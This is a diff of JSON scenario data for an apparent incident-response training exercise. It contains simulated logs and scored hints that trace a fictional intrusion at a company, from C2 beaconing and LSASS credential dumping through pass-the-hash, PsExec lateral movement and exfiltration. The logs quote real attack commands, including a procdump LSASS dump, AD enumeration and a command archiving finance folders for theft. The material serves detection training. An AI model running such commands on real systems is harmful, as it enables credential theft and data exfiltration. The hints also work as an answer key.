+          "isEvidence": true,
+          "evidenceTag": "c2-beaconing-pattern",
+          "sortOrder": 6
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event 4688 \u2014 New process created: svchost32.exe launched from C:\\Users\\r.johnson\\AppData\\Local\\Temp\\. This is the renamed malicious binary masquerading as the legitimate Windows svchost.exe. Note the non-standard path and the '32' suffix.",
+          "rawLog": {
+            "EventID": 4688,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-10-14T08:49:00Z",
+            "Computer": "WS-EXEC01.corpsec.local",
+            "SubjectUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1142",
+            "SubjectUserName": "r.johnson",
+            "SubjectDomainName": "CORPSEC",
+            "SubjectLogonId": "0x3E7A1B",
+            "NewProcessId": "0x2390",
+            "NewProcessName": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1C9C",
+            "CommandLine": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent --config C:\\Users\\r.johnson\\AppData\\Roaming\\Microsoft\\config.dat",
+            "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "MandatoryLabel": "S-1-16-8192"
+          },
+          "severity": "MEDIUM",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "svchost32.exe",
+          "eventId": "4688",
+          "timestamp": "2025-10-14T08:49:00Z",
+          "isEvidence": true,
+          "evidenceTag": "renamed-binary-execution",
+          "sortOrder": 7
+        }
+      ],
+      "hints": [
+        {
+          "content": "Look at the EDR alert's binaryAnalysis section. The file is named 'svchost32.exe' but the original filename in the PE header is 'beacon_x64.exe' \u2014 a strong indicator of a Cobalt Strike or similar C2 implant.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The attacker used TWO persistence mechanisms: a Registry Run key (HKCU\\...\\Run\\WindowsSecurityUpdate) and a scheduled task (MicrosoftEdgeUpdateCore). Both names are designed to look legitimate. This redundancy is a hallmark of APT operations.",
+          "pointsPenalty": 3,
+          "sortOrder": 2
+        },
+        {
+          "content": "The network flow log shows a beaconing score of 0.97 (nearly perfect regularity) with 60-second intervals. Legitimate applications rarely maintain such precise timing. This jitter-free pattern is a classic C2 detection indicator.",
+          "pointsPenalty": 5,
+          "sortOrder": 3
+        }
+      ]
+    },
+    {
+      "stageNumber": 3,
+      "title": "Privilege Escalation & Credential Theft",
+      "description": "With a stable foothold on the CFO's workstation, the attacker escalates privileges and dumps credentials from LSASS memory. The stolen domain admin NTLM hash will enable the next phase of lateral movement.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event 4672 \u2014 Special privileges assigned to new logon for r.johnson on WS-EXEC01. SeDebugPrivilege was granted, which allows debugging other processes \u2014 a prerequisite for dumping LSASS memory.",
+          "rawLog": {
+            "EventID": 4672,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-10-14T10:12:44Z",
+            "Computer": "WS-EXEC01.corpsec.local",
+            "SubjectUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1142",
+            "SubjectUserName": "r.johnson",
+            "SubjectDomainName": "CORPSEC",
+            "SubjectLogonId": "0x3E7A1B",
+            "PrivilegeList": "SeDebugPrivilege\n\t\tSeImpersonatePrivilege\n\t\tSeBackupPrivilege\n\t\tSeRestorePrivilege\n\t\tSeTakeOwnershipPrivilege"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "eventId": "4672",
+          "timestamp": "2025-10-14T10:12:44Z",
+          "isEvidence": true,
+          "evidenceTag": "sedebugprivilege-assigned",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 10 \u2014 Process accessed: svchost32.exe (PID 9104) accessed lsass.exe (PID 672) with PROCESS_VM_READ access rights on WS-EXEC01. This is a direct indicator of credential dumping from LSASS memory.",
+          "rawLog": {
+            "EventID": 10,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T10:12:48Z",
+            "SourceProcessGUID": "{c3d4e5f6-a7b8-9012-cdef-012345678901}",
+            "SourceProcessId": 9104,
+            "SourceThreadId": 7856,
+            "SourceImage": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
+            "TargetProcessGUID": "{00000000-0000-0000-0000-000000000672}",
+            "TargetProcessId": 672,
+            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+            "GrantedAccess": "0x1010",
+            "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9D4C4|C:\\Windows\\System32\\KERNELBASE.dll+2C13E|C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe+5A210",
+            "SourceUser": "CORPSEC\\r.johnson",
+            "TargetUser": "NT AUTHORITY\\SYSTEM"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "svchost32.exe",
+          "eventId": "10",
+          "timestamp": "2025-10-14T10:12:48Z",
+          "isEvidence": true,
+          "evidenceTag": "lsass-memory-access",
+          "sortOrder": 2
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert (CRITICAL) \u2014 Credential theft tool detected. Process svchost32.exe on WS-EXEC01 accessed LSASS memory with read permissions. Behavioral analysis matches known credential dumping techniques (Mimikatz-style). MITRE T1003.001.",
+          "rawLog": {
+            "alertId": "EDR-2025-18751",
+            "severity": "CRITICAL",
+            "timestamp": "2025-10-14T10:12:49Z",
+            "hostname": "WS-EXEC01",
+            "username": "r.johnson",
+            "processName": "svchost32.exe",
+            "processPath": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
+            "alertType": "Credential Dumping - LSASS Memory Access",
+            "detectionRule": "CRED_DUMP_LSASS_ACCESS",
+            "mitreTactic": "Credential Access",
+            "mitreTechnique": "T1003.001",
+            "riskScore": 98,
+            "targetProcess": "lsass.exe",
+            "targetPid": 672,
+            "accessMask": "0x1010 (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ)",
+            "action": "ALERT_ONLY",
+            "credentialsAtRisk": [
+              "CORPSEC\\r.johnson (local cached)",
+              "CORPSEC\\admin.rjohnson (domain admin, cached)",
+              "CORPSEC\\svc-backup (service account, cached)",
+              "CORPSEC\\administrator (local admin)"
+            ],
+            "recommendation": "Isolate host immediately. Reset all cached credentials."
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "svchost32.exe",
+          "timestamp": "2025-10-14T10:12:49Z",
+          "isEvidence": true,
+          "evidenceTag": "edr-credential-theft-alert",
+          "sortOrder": 3
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 1 \u2014 Process creation: svchost32.exe spawned procdump64.exe targeting lsass.exe on WS-EXEC01. The attacker is using Sysinternals ProcDump to create a memory dump of LSASS for offline credential extraction.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T10:13:02Z",
+            "ProcessGuid": "{d4e5f6a7-b8c9-0123-defa-123456789012}",
+            "ProcessId": 10248,
+            "Image": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\procdump64.exe",
+            "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\r.johnson\\AppData\\Local\\Temp\\debug.dmp",
+            "CurrentDirectory": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\",
+            "User": "CORPSEC\\r.johnson",
+            "LogonGuid": "{a1b2c3d4-0001-0002-0003-000000000001}",
+            "LogonId": "0x3E7A1B",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=7b4b1c7e2f19a6f31d2c2b3a4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e",
+            "ParentProcessGuid": "{c3d4e5f6-a7b8-9012-cdef-012345678901}",
+            "ParentProcessId": 9104,
+            "ParentImage": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
+            "ParentCommandLine": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent --config C:\\Users\\r.johnson\\AppData\\Roaming\\Microsoft\\config.dat"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "procdump64.exe",
+          "eventId": "1",
+          "timestamp": "2025-10-14T10:13:02Z",
+          "isEvidence": true,
+          "evidenceTag": "procdump-lsass-dump",
+          "sortOrder": 4
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event 4648 \u2014 Explicit credential logon: A logon was attempted using explicit credentials on WS-EXEC01. The process svchost32.exe used the NTLM hash of domain admin account 'admin.rjohnson' to authenticate. This indicates Pass the Hash activity.",
+          "rawLog": {
+            "EventID": 4648,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-10-14T10:22:15Z",
+            "Computer": "WS-EXEC01.corpsec.local",
+            "SubjectUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1142",
+            "SubjectUserName": "r.johnson",
+            "SubjectDomainName": "CORPSEC",
+            "SubjectLogonId": "0x3E7A1B",
+            "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
+            "TargetUserName": "admin.rjohnson",
+            "TargetDomainName": "CORPSEC",
+            "TargetLogonGuid": "{a1b2c3d4-9999-8888-7777-666655554444}",
+            "TargetServerName": "SRV-FS01.corpsec.local",
+            "TargetInfo": "SRV-FS01.corpsec.local",
+            "ProcessId": "0x2390",
+            "ProcessName": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
+            "NetworkAddress": "10.0.3.10",
+            "Port": 445
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "svchost32.exe",
+          "sourceIp": "10.0.1.25",
+          "destIp": "10.0.3.10",
+          "eventId": "4648",
+          "timestamp": "2025-10-14T10:22:15Z",
+          "isEvidence": true,
+          "evidenceTag": "pass-the-hash-attempt",
+          "sortOrder": 5
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Correlation Alert (CRITICAL) \u2014 Privilege escalation chain detected on WS-EXEC01. Alert chain: SeDebugPrivilege assignment -> LSASS memory access -> procdump execution -> explicit credential logon with domain admin account. Full credential theft lifecycle observed in 10-minute window.",
+          "rawLog": {
+            "alertId": "SIEM-CORR-2025-4419",
+            "ruleName": "Privilege Escalation and Credential Theft Chain",
+            "severity": "CRITICAL",
+            "timestamp": "2025-10-14T10:22:20Z",
+            "description": "Correlated privilege escalation chain detected: debug privilege assignment followed by LSASS memory access, memory dump creation, and explicit credential logon using domain admin account",
+            "correlatedEvents": [
+              {
+                "eventType": "Windows Event 4672",
+                "description": "SeDebugPrivilege assigned to r.johnson",
+                "timestamp": "2025-10-14T10:12:44Z"
+              },
+              {
+                "eventType": "Sysmon Event 10",
+                "description": "svchost32.exe accessed lsass.exe with VM_READ",
+                "timestamp": "2025-10-14T10:12:48Z"
+              },
+              {
+                "eventType": "Sysmon Event 1",
+                "description": "procdump64.exe -ma lsass.exe executed",
+                "timestamp": "2025-10-14T10:13:02Z"
+              },
+              {
+                "eventType": "Windows Event 4648",
+                "description": "Explicit logon as admin.rjohnson targeting SRV-FS01",
+                "timestamp": "2025-10-14T10:22:15Z"
+              }
+            ],
+            "affectedHost": "WS-EXEC01",
+            "affectedUser": "r.johnson",
+            "compromisedAccount": "admin.rjohnson (Domain Admin)",
+            "timeWindow": "10 minutes",
+            "dataSources": ["Windows Security", "Sysmon", "EDR"],
+            "recommendation": "IMMEDIATE: Isolate WS-EXEC01, disable admin.rjohnson account, reset KRBTGT password twice"
+          },
+          "severity": "CRITICAL",
+          "hostname": "SIEM-01",
+          "username": "r.johnson",
+          "timestamp": "2025-10-14T10:22:20Z",
+          "isEvidence": true,
+          "evidenceTag": "siem-credential-theft-chain",
+          "sortOrder": 6
+        }
+      ],
+      "hints": [
+        {
+          "content": "The Sysmon Event 10 log is the key evidence for credential dumping. GrantedAccess value 0x1010 corresponds to PROCESS_QUERY_INFORMATION | PROCESS_VM_READ \u2014 the minimum access rights needed to read process memory for credential extraction.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The EDR alert reveals which credentials were cached on this machine: r.johnson, admin.rjohnson (domain admin!), svc-backup, and the local administrator. The domain admin credential is the attacker's highest-value target.",
+          "pointsPenalty": 3,
+          "sortOrder": 2
+        },
+        {
+          "content": "Event 4648 shows the attacker used the stolen admin.rjohnson hash to authenticate to SRV-FS01 on port 445 (SMB). This is Pass the Hash (T1550.002) \u2014 they never needed the plaintext password, only the NTLM hash from the LSASS dump.",
+          "pointsPenalty": 5,
+          "sortOrder": 3
+        }
+      ]
+    },
+    {
+      "stageNumber": 4,
+      "title": "Lateral Movement & Discovery",
+      "description": "Armed with domain admin credentials, the attacker moves laterally across the network using Pass the Hash and PsExec. Multiple servers are compromised including the file server, application server, and the domain controller. Active Directory enumeration reveals the full scope of the target environment.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event 4624 \u2014 Successful network logon (Type 3) on SRV-FS01 using NTLM authentication as admin.rjohnson from source 10.0.1.25 (WS-EXEC01). NTLM usage for a domain admin connecting to a file server is highly suspicious \u2014 Kerberos should be the normal authentication protocol.",
+          "rawLog": {
+            "EventID": 4624,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-10-14T10:22:18Z",
+            "Computer": "SRV-FS01.corpsec.local",
+            "SubjectUserSid": "S-1-0-0",
+            "SubjectUserName": "-",
+            "SubjectDomainName": "-",
+            "SubjectLogonId": "0x0",
+            "TargetUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1201",
+            "TargetUserName": "admin.rjohnson",
+            "TargetDomainName": "CORPSEC",
+            "TargetLogonId": "0x5A8C12",
+            "LogonType": 3,
+            "LogonProcessName": "NtLmSsp",
+            "AuthenticationPackageName": "NTLM",
+            "WorkstationName": "WS-EXEC01",
+            "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
+            "TransmittedServices": "-",
+            "LmPackageName": "NTLM V2",
+            "KeyLength": 128,
+            "IpAddress": "10.0.1.25",
+            "IpPort": 49802,
+            "ImpersonationLevel": "%%1833"
+          },
+          "severity": "HIGH",
+          "hostname": "SRV-FS01",
+          "username": "admin.rjohnson",
+          "sourceIp": "10.0.1.25",
+          "destIp": "10.0.3.10",
+          "eventId": "4624",
+          "timestamp": "2025-10-14T10:22:18Z",
+          "isEvidence": true,
+          "evidenceTag": "lateral-movement-fs01",
+          "sortOrder": 1
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event 7045 \u2014 New service installed on SRV-FS01: PSEXESVC. PsExec installs this service on remote systems to enable command execution. Service binary path points to the ADMIN$ share, confirming remote execution via PsExec.",
+          "rawLog": {
+            "EventID": 7045,
+            "Source": "Service Control Manager",
+            "TimeCreated": "2025-10-14T10:22:22Z",
+            "Computer": "SRV-FS01.corpsec.local",
+            "ServiceName": "PSEXESVC",
+            "ImagePath": "%SystemRoot%\\PSEXESVC.exe",
+            "ServiceType": "user mode service",
+            "StartType": "demand start",
+            "AccountName": "LocalSystem",
+            "ServiceSid": "S-1-5-80-0"
+          },
+          "severity": "HIGH",
+          "hostname": "SRV-FS01",
+          "username": "admin.rjohnson",
+          "eventId": "7045",
+          "timestamp": "2025-10-14T10:22:22Z",
+          "isEvidence": true,
+          "evidenceTag": "psexec-service-fs01",
+          "sortOrder": 2
+        },
+        {
+          "logType": "NETWORK_FLOW",
+          "summary": "Network Flow \u2014 Significant SMB traffic spike (port 445) from WS-EXEC01 (10.0.1.25) to multiple internal servers: SRV-FS01 (10.0.3.10), SRV-APP02 (10.0.3.25), and SRV-DC01 (10.0.2.5). Total transfer volume: 4.2 MB in 15 minutes, far exceeding the CFO workstation's normal SMB baseline.",
+          "rawLog": {
+            "timestamp": "2025-10-14T10:45:00Z",
+            "flowSummary": "SMB traffic spike from 10.0.1.25 to multiple internal servers",
+            "srcIp": "10.0.1.25",
+            "srcHostname": "WS-EXEC01",
+            "protocol": "TCP",
+            "dstPort": 445,
+            "observationWindow": "10:22:15 - 10:45:00",
+            "destinations": [
+              {
+                "dstIp": "10.0.3.10",
+                "dstHostname": "SRV-FS01",
+                "connectionCount": 47,
+                "bytesOut": 1892352,
+                "bytesIn": 856064
+              },
+              {
+                "dstIp": "10.0.3.25",
+                "dstHostname": "SRV-APP02",
+                "connectionCount": 23,
+                "bytesOut": 524288,
+                "bytesIn": 262144
+              },
+              {
+                "dstIp": "10.0.2.5",
+                "dstHostname": "SRV-DC01",
+                "connectionCount": 31,
+                "bytesOut": 458752,
+                "bytesIn": 393216
+              }
+            ],
+            "totalConnections": 101,
+            "totalBytesOut": 2875392,
+            "totalBytesIn": 1511424,
+            "baselineConnections": 5,
+            "baselineDeviation": "1920%",
+            "action": "ALLOW"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "sourceIp": "10.0.1.25",
+          "timestamp": "2025-10-14T10:45:00Z",
+          "isEvidence": true,
+          "evidenceTag": "smb-traffic-spike",
+          "sortOrder": 3
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event 4624 \u2014 Successful network logon (Type 3) on domain controller SRV-DC01 using NTLM authentication as admin.rjohnson from source 10.0.1.25. Domain admin NTLM logon to a DC is a critical indicator \u2014 this gives the attacker full control of the Active Directory domain.",
+          "rawLog": {
+            "EventID": 4624,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-10-14T10:35:42Z",
+            "Computer": "SRV-DC01.corpsec.local",
+            "SubjectUserSid": "S-1-0-0",
+            "SubjectUserName": "-",
+            "SubjectDomainName": "-",
+            "SubjectLogonId": "0x0",
+            "TargetUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1201",
+            "TargetUserName": "admin.rjohnson",
+            "TargetDomainName": "CORPSEC",
+            "TargetLogonId": "0x7B2D44",
+            "LogonType": 3,
+            "LogonProcessName": "NtLmSsp",
+            "AuthenticationPackageName": "NTLM",
+            "WorkstationName": "WS-EXEC01",
+            "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
+            "TransmittedServices": "-",
+            "LmPackageName": "NTLM V2",
+            "KeyLength": 128,
+            "IpAddress": "10.0.1.25",
+            "IpPort": 49891,
+            "ImpersonationLevel": "%%1833"
+          },
+          "severity": "CRITICAL",
+          "hostname": "SRV-DC01",
+          "username": "admin.rjohnson",
+          "sourceIp": "10.0.1.25",
+          "destIp": "10.0.2.5",
+          "eventId": "4624",
+          "timestamp": "2025-10-14T10:35:42Z",
+          "isEvidence": true,
+          "evidenceTag": "dc-compromise",
+          "sortOrder": 4
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 1 \u2014 Process creation on SRV-DC01: cmd.exe spawned net.exe with command 'net group \"Domain Admins\" /domain'. The attacker is enumerating the Domain Admins group to identify additional privileged accounts for persistence.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T10:36:15Z",
+            "ProcessGuid": "{e5f6a7b8-c9d0-1234-efab-234567890123}",
+            "ProcessId": 5892,
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net group \"Domain Admins\" /domain",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "CORPSEC\\admin.rjohnson",
+            "LogonGuid": "{e5f6a7b8-0001-0002-0003-000000000002}",
+            "LogonId": "0x7B2D44",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=aab8b84b6fd512d78986d34d1c7d8e2d6f0ee6c3a86577b5213e1b06c14e8c9d",
+            "ParentProcessGuid": "{e5f6a7b8-c9d0-1234-efab-234567890122}",
+            "ParentProcessId": 5780,
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe /c \"net group \"Domain Admins\" /domain && net group \"Enterprise Admins\" /domain && nltest /dclist:corpsec.local\""
+          },
+          "severity": "HIGH",
+          "hostname": "SRV-DC01",
+          "username": "admin.rjohnson",
+          "processName": "net.exe",
+          "eventId": "1",
+          "timestamp": "2025-10-14T10:36:15Z",
+          "isEvidence": true,
+          "evidenceTag": "ad-enumeration",
+          "sortOrder": 5
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert (CRITICAL) \u2014 Lateral movement indicators detected. Domain admin account 'admin.rjohnson' authenticated via NTLM from WS-EXEC01 to 3 internal servers within 13 minutes. PsExec service installed on SRV-FS01. AD enumeration commands executed on SRV-DC01.",
+          "rawLog": {
+            "alertId": "EDR-2025-18759",
+            "severity": "CRITICAL",
+            "timestamp": "2025-10-14T10:45:05Z",
+            "hostname": "Multiple",
+            "username": "admin.rjohnson",
+            "alertType": "Lateral Movement Campaign Detected",
+            "detectionRule": "LATERAL_MOVEMENT_NTLM_MULTI_HOST",
+            "mitreTactic": "Lateral Movement",
+            "mitreTechnique": "T1021.002",
+            "riskScore": 96,
+            "sourceHost": "WS-EXEC01 (10.0.1.25)",
+            "targetHosts": [
+              {
+                "hostname": "SRV-FS01",
+                "ip": "10.0.3.10",
+                "authType": "NTLM",
+                "timestamp": "2025-10-14T10:22:18Z",
+                "tools": ["PsExec"]
+              },
+              {
+                "hostname": "SRV-APP02",
+                "ip": "10.0.3.25",
+                "authType": "NTLM",
+                "timestamp": "2025-10-14T10:28:33Z",
+                "tools": ["WMI"]
+              },
+              {
+                "hostname": "SRV-DC01",
+                "ip": "10.0.2.5",
+                "authType": "NTLM",
+                "timestamp": "2025-10-14T10:35:42Z",
+                "tools": ["PsExec", "net.exe", "nltest.exe"]
+              }
+            ],
+            "timeWindow": "13 minutes",
+            "recommendation": "CRITICAL: Isolate all affected hosts. Domain controller compromise suspected. Initiate full IR plan."
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-EXEC01",
+          "username": "admin.rjohnson",
+          "sourceIp": "10.0.1.25",
+          "timestamp": "2025-10-14T10:45:05Z",
+          "isEvidence": true,
+          "evidenceTag": "edr-lateral-movement-campaign",
+          "sortOrder": 6
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event 7045 \u2014 New service installed on SRV-APP02: PSEXESVC. A second PsExec service installation on a different server confirms the attacker is systematically spreading across the network using the compromised domain admin credentials.",
+          "rawLog": {
+            "EventID": 7045,
+            "Source": "Service Control Manager",
+            "TimeCreated": "2025-10-14T10:28:36Z",
+            "Computer": "SRV-APP02.corpsec.local",
+            "ServiceName": "PSEXESVC",
+            "ImagePath": "%SystemRoot%\\PSEXESVC.exe",
+            "ServiceType": "user mode service",
+            "StartType": "demand start",
+            "AccountName": "LocalSystem",
+            "ServiceSid": "S-1-5-80-0"
+          },
+          "severity": "HIGH",
+          "hostname": "SRV-APP02",
+          "username": "admin.rjohnson",
+          "eventId": "7045",
+          "timestamp": "2025-10-14T10:28:36Z",
+          "isEvidence": true,
+          "evidenceTag": "psexec-service-app02",
+          "sortOrder": 7
+        }
+      ],
+      "hints": [
+        {
+          "content": "Pay attention to the authentication protocol in the Event 4624 logs. 'AuthenticationPackageName: NTLM' for a domain admin accessing servers is suspicious \u2014 in a healthy Active Directory environment, Kerberos would be used. NTLM authentication often indicates Pass the Hash.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The network flow log shows a 1,920% deviation from the baseline SMB traffic for WS-EXEC01. The CFO workstation normally generates about 5 SMB connections per observation window, but 101 were observed \u2014 a clear sign of automated lateral movement and file share enumeration.",
+          "pointsPenalty": 3,
+          "sortOrder": 2
+        },
+        {
+          "content": "The attacker's sequence on SRV-DC01 reveals their objectives: 'net group Domain Admins /domain' lists domain admin accounts, 'net group Enterprise Admins /domain' lists enterprise admins, and 'nltest /dclist:corpsec.local' enumerates all domain controllers. This is reconnaissance for persistent domain access.",
+          "pointsPenalty": 5,
+          "sortOrder": 3
+        }
+      ]
+    },
+    {
+      "stageNumber": 5,
+      "title": "Data Exfiltration & Impact \u2014 Double Extortion",
+      "description": "The attacker executes their final objectives: sensitive financial data is compressed and exfiltrated to an external server, followed by ransomware deployment. Event logs are cleared to hamper forensic investigation. This is a classic 'double extortion' attack \u2014 data theft combined with encryption.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 1 \u2014 Process creation on SRV-FS01: 7z.exe (7-Zip) compressing the Finance department's shared drive into an encrypted archive. The attacker is staging sensitive financial data for exfiltration.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T11:30:22Z",
+            "ProcessGuid": "{f6a7b8c9-d0e1-2345-fabc-345678901234}",
+            "ProcessId": 12480,
+            "Image": "C:\\Windows\\Temp\\7z.exe",
+            "CommandLine": "7z.exe a -p\"S1lkTyph00n!\" -mhe=on C:\\Windows\\Temp\\backup_q3.7z \"D:\\Finance\\Q3-Reports\\\" \"D:\\Finance\\Projections\\\" \"D:\\Finance\\M&A-Confidential\\\" \"D:\\Executive\\Board-Materials\\\"",
+            "CurrentDirectory": "C:\\Windows\\Temp\\",
+            "User": "CORPSEC\\admin.rjohnson",
+            "LogonGuid": "{f6a7b8c9-0001-0002-0003-000000000003}",
+            "LogonId": "0x5A8C12",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
+            "ParentProcessGuid": "{f6a7b8c9-d0e1-2345-fabc-345678901233}",
+            "ParentProcessId": 12100,
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe /c C:\\Windows\\Temp\\exfil.bat"
+          },
+          "severity": "CRITICAL",
+          "hostname": "SRV-FS01",
+          "username": "admin.rjohnson",
+          "processName": "7z.exe",
+          "eventId": "1",
+          "timestamp": "2025-10-14T11:30:22Z",
+          "isEvidence": true,
+          "evidenceTag": "data-staging-compression",
+          "sortOrder": 1
+        },
+        {
+          "logType": "NETWORK_FLOW",
+          "summary": "Network Flow \u2014 Large outbound data transfer from SRV-FS01 (10.0.3.10) to external IP 91.215.85.17 on port 443. Total outbound transfer: 847 MB over 22 minutes. This volume is extremely anomalous for a file server that should have no external communication.",
+          "rawLog": {
+            "timestamp": "2025-10-14T12:15:00Z",
+            "flowSummary": "Large outbound transfer from SRV-FS01 to external IP",
+            "srcIp": "10.0.3.10",
+            "srcHostname": "SRV-FS01",
+            "srcPort": 49922,
+            "dstIp": "91.215.85.17",
+            "dstPort": 443,
+            "protocol": "TCP",
+            "observationWindow": "11:53:00 - 12:15:00",
+            "totalBytesOut": 888020992,
+            "totalBytesIn": 2457600,
+            "duration": 1320,
+            "avgThroughput": "5.4 Mbps",
+            "connectionCount": 1,
+            "tlsVersion": "TLSv1.3",
+            "ja3Hash": "cd028c3b7beb88a4c72d637cb1f4bc6e",
+            "sniHostname": "storage-sync-cdn.cloudfront-api.com",
+            "baselineExternalTraffic": "0 bytes (server has no normal external communication)",
+            "action": "ALLOW"
+          },
+          "severity": "CRITICAL",
+          "hostname": "SRV-FS01",
+          "sourceIp": "10.0.3.10",
+          "destIp": "91.215.85.17",
+          "timestamp": "2025-10-14T12:15:00Z",
+          "isEvidence": true,
+          "evidenceTag": "data-exfiltration-transfer",
+          "sortOrder": 2
+        },
+        {
+          "logType": "PROXY",
+          "summary": "Proxy Log \u2014 HTTPS POST connection from SRV-FS01 (10.0.3.10) to storage-sync-cdn.cloudfront-api.com (91.215.85.17) uploading large data payload. The domain impersonates a CloudFront CDN but resolves to a known attacker-controlled IP. Content-Type indicates binary file upload.",
+          "rawLog": {
+            "timestamp": "2025-10-14T11:53:15Z",
+            "sourceIp": "10.0.3.10",
+            "sourcePort": 49922,
+            "destIp": "91.215.85.17",
+            "destPort": 443,
+            "method": "POST",
+            "url": "https://storage-sync-cdn.cloudfront-api.com/api/v2/sync/upload",
+            "httpVersion": "1.1",
+            "statusCode": 200,
+            "contentType": "application/octet-stream",
+            "contentLength": 888020992,
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "referer": "-",
+            "action": "ALLOWED",
+            "category": "Cloud Storage",
+            "tlsVersion": "TLSv1.3",
+            "sniHostname": "storage-sync-cdn.cloudfront-api.com",
+            "hostname": "SRV-FS01",
+            "username": "admin.rjohnson",
+            "bytesOut": 888020992,
+            "bytesIn": 2457600,
+            "duration": 1320.5,
+            "riskCategory": "Data Loss Prevention Alert"
+          },
+          "severity": "CRITICAL",
+          "hostname": "SRV-FS01",
+          "username": "admin.rjohnson",
+          "sourceIp": "10.0.3.10",
+          "destIp": "91.215.85.17",
+          "timestamp": "2025-10-14T11:53:15Z",
+          "isEvidence": true,
+          "evidenceTag": "exfiltration-proxy-log",
+          "sortOrder": 3
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 1 \u2014 Process creation on SRV-FS01: vssadmin.exe executed to delete all Volume Shadow Copies. This is a ransomware preparation technique that prevents victims from restoring files from shadow copies after encryption.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T13:30:05Z",
+            "ProcessGuid": "{a7b8c9d0-e1f2-3456-abcd-456789012345}",
+            "ProcessId": 14220,
